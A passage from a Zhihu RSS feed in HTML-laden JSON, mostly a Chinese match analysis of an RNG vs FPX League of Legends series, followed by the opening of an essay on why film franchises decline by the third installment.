width=\"398\"></figure><p>此时，皎月在打先锋，FPX想放弃先锋重点去争夺小龙，所以他们让Lwx去处理下路兵线。不过Lwx走得太深入了，遭到了小虎的绕后TPgank。</p>\n<p>这波大家都记得，不过，大家记不记得这波打完以后RNG的处理？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1963725442ab3542080760711516e852_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"398\" class=\"content_image\" width=\"394\"></figure><p>他们让鳄鱼去上，AD和辅助去下，中路完全空置。等到打完小龙以后，一个状态一般的格温才走到中路去清线。</p>\n<p>FPX立刻意识到，此时他们在中塔争夺上，人数反而比RNG更多，因为RNG重点在下路和小龙！</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-cd2a2271ed6d4801627115d032f4c11f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2144\" data-rawheight=\"1014\" class=\"origin_image zh-lightbox-thumb\" width=\"2144\" data-original=\"https://pic4.zhimg.com/v2-cd2a2271ed6d4801627115d032f4c11f_r.jpg\"></figure><p>盲僧果断交R打格温的血量，随后配合支援过来的队友将中一塔拆掉。</p>\n<p>RNG用中一塔为代价，交换到一只先锋、一条小龙、一座下一塔，赚一定是赚的。不过先推掉中一塔的人会有一个优势，那就是在推掉中一塔的时候，两侧一定处于无人看守的阶段，此时抓边成功率极高。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0fbe0cd81d8236e44e4d0067a4fbcc47_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"386\" class=\"content_image\" width=\"400\"></figure><p>RNG不是没有察觉，他们狂ping小地图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bc021b8ed64c759339a877384b723c1b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1230\" data-rawheight=\"1050\" class=\"origin_image zh-lightbox-thumb\" width=\"1230\" data-original=\"https://pic4.zhimg.com/v2-bc021b8ed64c759339a877384b723c1b_r.jpg\"></figure><p>然后Cryin还往回走。。。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9231873970d1ce939fbdbea93da878ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"398\" class=\"content_image\" width=\"398\"></figure><p>这波Cryin阵亡，保住上一塔，同时RNG推掉FPX中一塔，你说谁赚？</p>\n<p>一定是FPX。</p>\n<p>第一，Cryin的人头被Nuguri吃到，大大弥补了后者的发育不良。</p>\n<p>第二，FPX推掉RNG中一的时候，中路有三个人，可以快速实施抓边。而RNG只有一个人来推FPX的中一塔，下路双人组和上单都需要去两条边路清线，拆掉中一塔以后没有办法迅速做入侵视野。</p>\n<p>这波不如放掉上一塔都好一点，RNG双人组在中的话，可以去FPX野区做很多深入的眼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-539899f93fc59357e1bc7969799b6ce2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"390\" class=\"content_image\" width=\"394\"></figure><p>RNG曾经试着聚集起来，看看能不能做深入视野，但FPX完全没有给到他们机会。相反，瑟提还在上路自由发育带线，非常舒服。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6f864f3c5df88a9acbb62f91d92d02a6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"396\" class=\"content_image\" width=\"398\"></figure><p>而等到FPX聚集到一起做视野的时候，他们就做了一个非常优秀的视野。看小地图，做在RNG蓝buff那边的假眼。</p>\n<p>这个假眼，给到了FPX抓死小虎的伏笔。因为Doinb就是TP这个眼，成功绕后的。</p>\n<p>我们以这张图来看RNG的视野，很明显没有几个。作为推掉三路外塔的一方，RNG视野如此没有侵略性，也是不该的。</p>\n<p>而且在分线期，RNG让发育一般的鳄鱼去下路对抗盲僧，而让发育领先的格温去上路守瑟提的线。但是在此过程中，他们既没有考虑在上半区做眼，去抓发育不良的瑟提，也没有考虑让格温去下，利用单打创造优势。算上视野，RNG的分线期基本什么都没有做。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-faede93fc47c353246b1e34ced70edec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"982\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-faede93fc47c353246b1e34ced70edec_r.jpg\"></figure><p>FPX抓到小虎，终结给到Tian，FPX中期支点终于获得巨量经济。</p>\n<p>随后，两队在小龙处打了一个旗鼓相当的团战，虽然结果是RNG取胜。但因为小虎的不断冒进，RNG丢失了打大龙的机会，让FPX最终在关键团前，拖到了盲僧的蓝盾。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d940d3d63aad58d2a4e36fa2abdace5d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1014\" data-rawheight=\"336\" class=\"origin_image zh-lightbox-thumb\" width=\"1014\" data-original=\"https://pic2.zhimg.com/v2-d940d3d63aad58d2a4e36fa2abdace5d_r.jpg\"></figure><p>为什么这个蓝盾关键？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d3df64e77be2070b43ec10b684b8ee22_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1612\" data-rawheight=\"1218\" class=\"origin_image zh-lightbox-thumb\" width=\"1612\" data-original=\"https://pic3.zhimg.com/v2-d3df64e77be2070b43ec10b684b8ee22_r.jpg\"></figure><p>上一秒，盲僧被插的像个刺猬。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b55729a81347be0d06776967f5b5fa61_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1454\" data-rawheight=\"1222\" class=\"origin_image zh-lightbox-thumb\" width=\"1454\" data-original=\"https://pic2.zhimg.com/v2-b55729a81347be0d06776967f5b5fa61_r.jpg\"></figure><p>下一秒，滑板鞋拔矛，触发了盲僧的血手，盲僧同时使用渴血战斧。你会感觉，算上这个护盾的话，盲僧血量和刚刚一模一样。</p>\n<p>这就是蓝盾的意义，这波Doinb单人切死RNG下路双人组，吃满了GALA的伤害后安然无事。</p>\n<p>我们总结一下，FPX中期是怎么拖住的？</p>\n<p>第一，Doinb疯狂偷资源。</p>\n<p>第二，RNG关键转线策略不当+分线期没有做事。在转线期，他们只派了状态一般的格温去守中，被FPX找到机会，利用人数优势破掉中一、做了后续入侵视野，成功抓单鳄鱼和格温。而RNG虽然也破掉FPX中一，但是没有后续的视野跟进，而且分线期没有积极做事，所以并没能从破掉中一的活动中收获成果。</p>\n<p>第三，小虎冒进，导致最能拿大龙的一波没去拿，让盲僧发育到三件套。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>3、关键团战</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d57050766a5cbd5b822f8c3bce1a9333_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1238\" data-rawheight=\"880\" class=\"origin_image zh-lightbox-thumb\" width=\"1238\" data-original=\"https://pic4.zhimg.com/v2-d57050766a5cbd5b822f8c3bce1a9333_r.jpg\"></figure><p>这波没啥多说的，FPX开的太差了，兰博大招全空，没有人管在最后方的小虎。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>三、总结</h3>\n<p>这局赢的是RNG，但是我个人看法，中期两队在运营策略上，FPX赢得更多。</p>\n<p>在第一局结束以后我的看法就是，如果FPX能忍住不做最后一波那种粗糙的开团也就是不给机会的话，那么RNG将很难拿下后两局。</p>\n<hr>\n<h2>第二局</h2>\n<h3>一、BP分析</h3>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d61ad48342fecf20c3a22bb0ba202bb1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2722\" data-rawheight=\"1524\" class=\"origin_image zh-lightbox-thumb\" width=\"2722\" data-original=\"https://pic2.zhimg.com/v2-d61ad48342fecf20c3a22bb0ba202bb1_r.jpg\"></figure><p>相较于第一局，FPX做了一个调整，那就是舍弃兰博+瑟提，更换为皎月+杰斯。</p>\n<p>这一点很重要，我们在第一局提到，皎月更加适配一些主动开团的体系。FPX认为上一局的问题是不够主动，而且瑟提打格温的counter也宣告失败，所以转头更换了新的上野组合。</p>\n<p>在这个转主动的思路下，FPX第二轮做出自ban维鲁斯的行为就很容易理解了。</p>\n<p>维鲁斯最适合塔姆，但是这样就欠缺主动性，FPX希望下路更加主动。</p>\n<p>那么卡莎+开团英雄几乎是唯一选择。</p>\n<p>这里是我认为RNG全三场BP唯一可以商讨的点，两队第二轮ban的顺序是：维鲁斯-泰坦-露露-塔姆，事实上FPX希望转主动性的打法，从拿皎月+ban维鲁斯中就可以看得出来。那么此时ban塔姆的收效并不大，不如改ban卡莎，因为卡莎是最好配合开团辅助的AD。</p>\n<p>第二轮，FPX果然出卡莎，此时RNG已经明白对面想打强开，故拿出自保能力最强的霞作为应对。日女在面对强开体系时，有一定的自保和先手能力，但是都比较弱，论强开不如泰坦稳定，论反手不如布隆全面。</p>\n<p>从总的阵容体系来说，FPX更为极端，全队贯彻冲阵体系，更为符合这个版本的思路。而RNG如果能在第二轮选小炮可能会更好一点，选霞的话，就是全面寄希望于上中的冲阵，整体阵容的协同上要求比FPX更高。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9124ba9609203c09c8e0d7f4a2dca9d1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2718\" data-rawheight=\"1514\" class=\"origin_image zh-lightbox-thumb\" width=\"2718\" data-original=\"https://pic2.zhimg.com/v2-9124ba9609203c09c8e0d7f4a2dca9d1_r.jpg\"></figure><p>从对线来看，上路杰斯小优，中路鳄鱼小优，下路卡莎+芮尔更容易拿线权。</p>\n<p>FPX的阵容重点是双边路，盲僧皎月需要利用双控制的稳定性，多去边路越塔，两个人想杀鳄鱼会需要一定装备，但是配合杰斯/芮尔去越塔则是非常容易。所以FPX需要趁中路兵线被鳄鱼推进去回推的时候，线野联动来给予边路压力，快速滚雪球拿下比赛。</p>\n<p>RNG的阵容重点是中野，鳄鱼兰博需要利用中路线权，尽可能在中野2v2上做到事情，然后辐射下路。格温缺乏控制所以比较难帮，最好帮的是有日女的下路，RNG如果能在下路打开突破口限制卡莎发育，那中期胜算将会很大。</p>\n<p>这把我是真没想到，Doinb成为Carry到最后的那个人。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>二、具体赛况</h3>\n<p>1、个人和团队，Cryin的鳄鱼困境</p>\n<p>两波随意的R你们都看得到，不说了。我们说一下团队对于鳄鱼战术的理解问题，以及Cryin在兵线调度上的问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-3a544bf32a35e20a938d884adc5fce81_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1546\" data-rawheight=\"1038\" class=\"origin_image zh-lightbox-thumb\" width=\"1546\" data-original=\"https://pic2.zhimg.com/v2-3a544bf32a35e20a938d884adc5fce81_r.jpg\"></figure><p>从这里开始，八分半，FPX中野击杀了一次鳄鱼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a378ad62aa8ad4422e60cace4d680e74_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"398\" class=\"content_image\" width=\"402\"></figure><p>随后，盲僧把兵线推进塔回家，Cryin复活上线。</p>\n<p>正常来说，这波鳄鱼可以把兵线彻底推进去，盲僧大概到那个时候才刚刚上线，Cryin会领先一波支援时间差。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-72d9374f08e196d5641302764d0849a5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>但是他没有，他把兵线推出去之后，反而是跑到野区拆了个假眼，把兵线放置在中路。</p>\n<p>这个时间点，Wei已经走到下路，RNG是打算对下路发起进攻的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4e4ddb7457a7a84f79e07616e94fde48_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"390\" data-rawheight=\"390\" class=\"content_image\" width=\"390\"></figure><p>等到Cryin再度回到线上把兵线推进去的时候，两个打野在下半区已经照面了。</p>\n<p>如果Cryin这波直接推线支援，那么等到兵线来的时候盲僧必须要在塔下守线，而鳄鱼可以跟兰博一起到场突袭下路，拿到人头会非常简单。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f3e83b938a921b40ece859840bb4c60e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1114\" data-rawheight=\"1016\" class=\"origin_image zh-lightbox-thumb\" width=\"1114\" data-original=\"https://pic3.zhimg.com/v2-f3e83b938a921b40ece859840bb4c60e_r.jpg\"></figure><p>最终的结果是，RNG没能获得击杀，只是利用先锋推掉下一塔，收益很少。</p>\n<p>这波是Cryin整个第二局的缩影，他对鳄鱼的线野联动理解我认为是有问题的。在明可以和兰博一起支援的兵线情况下，他的处理总是慢一步，进而没有办法和兰博产生联动。</p>\n<p>更麻烦的是，随后RNG开始放弃鳄鱼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-69e8587d79c52d0b58ac91d1ac5ddb0a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"402\" class=\"content_image\" width=\"402\"></figure><p>在下一塔被推掉以后，鳄鱼被放到了下路，双人组占中，打野往上靠。而FPX的分线是让杰斯继续维持对线，盲僧去下。</p>\n<p>那这种情况下，杰斯会被抓死，但是鳄鱼也没有资格去吃线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-c42e33dd2315ce3c3b4f4508e518b40c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2482\" data-rawheight=\"1134\" class=\"origin_image zh-lightbox-thumb\" width=\"2482\" data-original=\"https://pic1.zhimg.com/v2-c42e33dd2315ce3c3b4f4508e518b40c_r.jpg\"></figure><p>双方打野对靠，FPX倒霉的是上路杰斯，RNG倒霉的则是下路的鳄鱼。</p>\n<p>问题是，鳄鱼不能被这么牺牲，而且RNG在下半区没有绕后眼可以实施绕后，但是FPX却在上路有绕后眼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2ec28e9abd9690227047878466379c21_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1858\" data-rawheight=\"414\" class=\"origin_image zh-lightbox-thumb\" width=\"1858\" data-original=\"https://pic2.zhimg.com/v2-2ec28e9abd9690227047878466379c21_r.jpg\"></figure><p>可是你要说鳄鱼彻底被牺牲了吗？倒也没有，注意，这段时间Ming一直在靠下，他出门直接来下半区，利用扫描排了一圈视野，做了一个河道眼。在小龙还有3分40秒刷新的时候，这么做就是保护鳄鱼不被越塔。</p>\n<p>我们对比一下双方半区力量，在对推的局面里，FPX在下路投入了中野辅三人，中野推塔辅助反蹲。而RNG只在上路投入了上野两个人，辅助在下做视野。</p>\n<p>这样会有一种可能，那就是RNG上路推进节奏因为人数缺失，容易被打断。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d163639ae99b87216058fefb0facfdd6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"406\" data-rawheight=\"390\" class=\"content_image\" width=\"406\"></figure><p>果然被打断。</p>\n<p>盲僧拆掉塔，直接TP去上抓死兰博。这波抓死直接导致RNG这波进攻轮次停止，他们没办法在这波之内推完上一塔，必须要下波再来。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-fcc86aabc7ab1f34d742bd649ea6995d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1594\" data-rawheight=\"1012\" class=\"origin_image zh-lightbox-thumb\" width=\"1594\" data-original=\"https://pic2.zhimg.com/v2-fcc86aabc7ab1f34d742bd649ea6995d_r.jpg\"></figure><p>下路皎月负责把兵线推进去，然后断掉了鳄鱼的TP支援，随后往野区逃命去了，这波成功勾引出了GALA的闪现，13分42秒，GALA交闪拿人头没拿到。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-14eb3d092fb0027d5dc4716daf017d06_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"410\" data-rawheight=\"408\" class=\"content_image\" width=\"410\"></figure><p>随后继续分线期运营，RNG还是把格温放在上路吃线，但是此时他们把鳄鱼调来野区一起吃资源，因为下半区已经彻底归FPX控制，鳄鱼不能去下半区发育。但是这样一来，鳄鱼的发育就会进一步停滞。那么问题来了，为什么RNG在自身小龙压力极大的情况下，还要坚持打上半区？</p>\n<p>因为上一塔没推掉，他们执着的想去推上一塔。</p>\n<p>而上一塔没推掉的原因，就是RNG想放弃鳄鱼但又不想放弃鳄鱼的矛盾态度。如Ming直接去上参与推塔或反蹲，那么盲僧的TP就是葬送自己的优势，RNG很大概率能拿下上一塔。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d6fb81e60540ad167b5a965eb5a1ccd9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"382\" data-rawheight=\"390\" class=\"content_image\" width=\"382\"></figure><p>等到RNG终于推掉上一塔的时候，小龙已经快要刷新了。</p>\n<p>你说推上一塔是否重要？当然，RNG推掉了自然会有收益。但是在小龙情况非常不利之时，这么执着于上一塔真的好吗？</p>\n<p>因为FPX有两条小龙，所以在第三条小龙RNG必须来争，不能轻易地放龙魂点团。但是因为RNG主打上半区，那么一个下半区没有视野、没有兵线优势、AD没有闪现的RNG，要怎么去争这波团呢？</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bf8cf78d08a81e6e64480f32bf2fc483_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1970\" data-rawheight=\"1068\" class=\"origin_image zh-lightbox-thumb\" width=\"1970\" data-original=\"https://pic4.zhimg.com/v2-bf8cf78d08a81e6e64480f32bf2fc483_r.jpg\"></figure><p>答案就是争不了。这波打完以后，因为鳄鱼长期没有线吃而盲僧有，两人的差距已经拉到天堑之别，没法追回来了。</p>\n<p>我们总结一下，RNG为什么玩不好鳄鱼战术？</p>\n<p>第一，Cryin把鳄鱼当做加里奥在玩，所以会有第一波的亏线支援。但是他玩的又不够加里奥，所以才会有不快速推线支援的兵线处理动作，这种处于两种打法之间的思路，是两头都得不到的。</p>\n<p>第二，RNG对鳄鱼的态度不明确。他们把鳄鱼放在下路，是想牺牲鳄鱼发育的；他们让Ming出门去下半区排视野做眼，又是想保护鳄鱼的。这种两端纠结的态度让他们在转线期处处落于被动：FPX下路进逼，鳄鱼只能放弃发育；FPX上路抓人，RNG只能被抓。</p>\n<p>这就是标题所谓的个人和团队的困境，无论是选手还是战队，他们对于鳄鱼战术的理解都不稳定，既可以当工具人又需要C，既可以牺牲又需要保护。再加上我没提到的一些选手熟练度问题，比如提前开R等等，导致最后鳄鱼表现和发育极度落后</p>\n<hr>\n<h2>第三局</h2>\n<p>这把我们只说BP，人机般的对局没什么复盘意义。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-40169446a40e37be69b0bd2d8ea24735_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2714\" data-rawheight=\"1510\" class=\"origin_image zh-lightbox-thumb\" width=\"2714\" data-original=\"https://pic2.zhimg.com/v2-40169446a40e37be69b0bd2d8ea24735_r.jpg\"></figure><p>这把BP让RNG的英雄池短板暴露无遗。</p>\n<p>因为自己不能玩鳄鱼，所以鳄鱼给到对面，自己拿盲僧——但是盲僧被鳄鱼counter，而且FPX鳄鱼两路摇摆</p>\n<p>因为中路符合版本的前中期中单只有梦魇，但是梦魇打不过鳄鱼，所以只能出卡尔玛——佛耶戈、瑟提、格温全在外面</p>\n<p>卡尔玛加奥拉夫必须要等卡尔玛一个大件以后才有主动性，而且强度完全不如卡尔玛赵信，没有赵信的强开团能力——这个组合只能算是一个替代品，前三手出替代品是不是浪费？</p>\n<p>因为中野的强开能力不强，所以辅助必须要补牛头——小炮牛头下路拿什么抢线权？</p>\n<p>上路没法出鳄鱼，中路更多英雄没法出，导致整体BP全部受限。</p>\n<p>在MSI上，RNG就因为英雄池问题一度非常难做BP，好在后来Cryin练出了梦魇和中单卢锡安，但是在夏季赛的版本，中路前期对抗性进一步提升，梦魇很多时候都无法拿出来。在卢锡安持续被ban的情况下，Cryin能拿出什么英雄？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-32296fd931ea48ed3ec87dcf5c5171ca_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1032\" data-rawheight=\"738\" class=\"origin_image zh-lightbox-thumb\" width=\"1032\" data-original=\"https://pic3.zhimg.com/v2-32296fd931ea48ed3ec87dcf5c5171ca_r.jpg\"></figure><p>这里是夏季赛到现在为止，BP率超过25%的中路英雄列表。</p>\n<p>现在RNG很多时候需要依靠小虎，因为只有他跟上了版本练出了格温，成为队伍中期可能的支柱。但是一旦格温被ban，但靠盲僧在11.12或11.13是没法做到什么的，我在之前的一条动态里也给大家分享过外赛区的一个数据：上单盲僧胜率不断降低，因为好打盲僧的英雄越来越多。在这种大趋势下，上路又能拿出当前版本多少强势英雄？</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0942a1ca67b30996cc788517ac342cb9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1044\" data-rawheight=\"674\" class=\"origin_image zh-lightbox-thumb\" width=\"1044\" data-original=\"https://pic2.zhimg.com/v2-0942a1ca67b30996cc788517ac342cb9_r.jpg\"></figure><p>这是夏季赛到目前为止，BP率超过25%的上路英雄列表，鳄鱼、瑟提没法拿出来，成为小虎最致命的BP点。</p>\n<p>我不是很想说这些，因为MSI之前这些都说的差不多了。我以为在MSI上RNG解决了这个问题，但是伴随着版本的变化和格温、佛耶戈的解锁，上中英雄池发生巨变，如今摆在RNG面前的问题更加严峻。</p>\n<p>而且多提一句，Cryin的亏线支援思路，我不知道是谁定的，但是太有问题了：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2cab28661150dac291e52d604f1bf9d1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>这波卡尔玛去支援上路，被Doinb蹲到单杀，成为中路对线转折点。</p>\n<p>看兵线，Doinb是推一波兵线进塔，然后去支援的，Cryi是直接去上半区支援。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-82cf3abff5a0ce0114e666eaeae8db4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1196\" data-rawheight=\"1052\" class=\"origin_image zh-lightbox-thumb\" width=\"1196\" data-original=\"https://pic2.zhimg.com/v2-82cf3abff5a0ce0114e666eaeae8db4d_r.jpg\"></figure><p>亏线的结果就是5级打6级。</p>\n<p>虽然说6级对卡尔玛提升不是质变，但是多一级的大招，无论是Q的伤害还是E的护盾时间都会有提升。无论如何，没有这么支援的道理。</p>\n<hr>\n<h2>总结</h2>\n<p>RNG现在要考虑考虑怎么进季后赛了。隔离期间已经结束一段时间了，再练不出新东西就只能是人的问题了。而且相对于操作问题，比如GALA跳脸或者Cryin的迷之大招，我更关心的是RNG在中期运营层面的落后，这是我在以往的RNG身上所未曾发现的，希望失败不要影响他们的心态。</p>\n<p>这里为了防止理解错误，必须要说一句。RNG在中期运营的落后，不是指他们不做事，而是指他们做了事却没什么收益。比如第一局，RNG一波运营拿下先锋+小龙+下一塔，但因为防守不当导致中路丢失，进而导致鳄鱼被抓，还被FPX做了深入视野。反过来自己推掉FPX中塔的时候，因为人手不足所以没法做眼，这就是典型的“做了事但是没收益”，类似的还有第二局对鳄鱼的态度不明确，没有让Ming去上路帮忙拆塔，但是又非常执着于上一塔。</p>\n<p>FPX这一局展现出来的中期运营能力和抓机会能力很强，如果他们能保持这个状态，我觉得他们后续比赛的表现一定会一路上扬，前提是保持的住。</p>\n<p>但是Nuguri被疯狂单杀是不该的，如果不是他的ID是Nuguri，这换任何一个队伍可能下场直接换二队上来了。如果不是整个队伍中期运营实在强，他这种打法和状态在这个打前中期的版本基本不可能取得胜利，希望他尽快调整。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/YInTIanCLANG?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">尹天</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/384312961?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"为什么很多系列电影从第三部开始，口碑就不及前作了？","date":"2021-06-28 13:53:24","description":"\n<p>谈一谈个人的看法。</p>\n<p>对于一部电影而言，它最重要的东西是什么呢？又是什么区分开了电影和电视剧，让前者成为了艺术，而后者成为了快消品？这个答案当然会有很多层面和角度，但其中一个，必然会是主题表述上的-----不同于电视剧，每一部电影，都会是导演围绕既定中心的一次自我表达，表述逻辑的完整性和呈现方式，构成了这部作品客观质量的重要标准。</p>\n<p>如果我们将电影看作导演表达自己思想与内心的艺术门类，那么表达内容和表达效果理所当然地成为了最重要的环节。这一点，正是电视剧不具备的-----电视剧以剧情的连接作为特性，拉出了整体更长的剧情线索和叙事空间，从而增加了更多的元素丰富性，同时也带动了每一个单集中叙事的局部化，在这两个方面上让观者保持兴趣，留住悬念，将收视维持下去。这当然是契合商业化考虑的模式，但也让每一集作为独立作品的表意完整性被大幅度地打破，甚至彻底不复存在了。</p>\n<p>而电视剧的独特优势，也必然地被电影行业尝试复刻。这就带来了以三部曲为代表的系列电影这一产物。从创作角度上讲，这带来了更大的创作空间、素材资源，从而给予了自我表达系统上的更多可能性，有助于创作者的设计和灵感得到更多的发挥，从而拍出更为震慑人心的成果瞬间。而从商业性角度上讲，这也促成了电影对电视剧在消费者延续性、消费者基数扩充上的照搬，让电影获得比单片更大的商业成功。</p>\n<p>然而，这就带来了一个巨大的问题：电影终究是与电视剧不同---或”理应不同“----的作品，艺术性相对较强而商业性相对较弱。因此，在动用了电视剧的连续性模式而实现了商业诉求的同时，艺术性的保留必要，便为创作者们提出了更高的要求：他们需要在系列中的每一部作品里都实现相对的完整表达，并且让作品与作品串联后的整体形成更高层次上的完整表达。换句话说，单片独立的主题设定与表述系统要足够完善，而每一部的主题也要形成串联后大主题的一部分，各单片中的要素和线索也要再次整合，支撑着表述系统的整合，形成整个系列层级上的表达逻辑，对大主题进行引导。</p>\n<p><b>简而言之，系列中单片要有作为独立作品的完整性，而系列整体又要成为一个大的“作品”。那么，这就必然对创作者的能力有了很高的要求，且系列作品数量越多、体量越大，把握难度就越高。这种难度，就给予了系列电影创造的高难度，且越往后就越难。</b></p>\n<p>事实上，即使是拥有原作小说为基础、基本顺利地拍摄下去的超长篇系列《哈利波特》电影版，也在中后期的改编中出现了线索过多、关系过乱等基于体量基础的困难，被迫以“消除部分线索”与“各线均不深入且平行发展”的方法进行应对，让系列的中后期作品在一定程度上失去了戏剧性的起伏和强弱，变成了跑图转场一样的平铺直叙。</p>\n<p>有小说作为明确基础的电影尚且如此，可见系列电影创作的难度之高。而近年来，漫威影业将自己的电影系列赋予了“宇宙”的概念，也出现了在作品表达完整性上的巨大困难，单片质量良莠不齐，发挥起伏波动巨大。漫威影业固然也有着原作漫画的基础，但体量过于巨大，几乎不可能原样照搬。在商业角度上，不用多说，漫威影业创造了商业电影世界里迄今为止的最持久的“现象”，充分印证了电影系列在电视剧化后的天然优势。然而，在艺术角度上，漫威电影宇宙，却遭到了科波拉和西科塞斯的批评。</p>\n<p>科波拉对于漫威的看低，或许来自于双方在电影创作理念的出发点和理解观念不同所导致---电视剧化的创作，电影化的表述。</p>\n<p>对于科波拉这样的大师而言，他所理解的电影，应当是偏向于传统的：一部单片作品，要看到完整的主题表达，严密的主题叙述逻辑，一切都围绕着主题表达的要素分布，并构成一个能够自洽的主题表达系统。在一般意义上讲，电影是导演将自己的想法传达给观众的媒介，形成自己对主题的表达。再延伸来讲，许多大师级人物 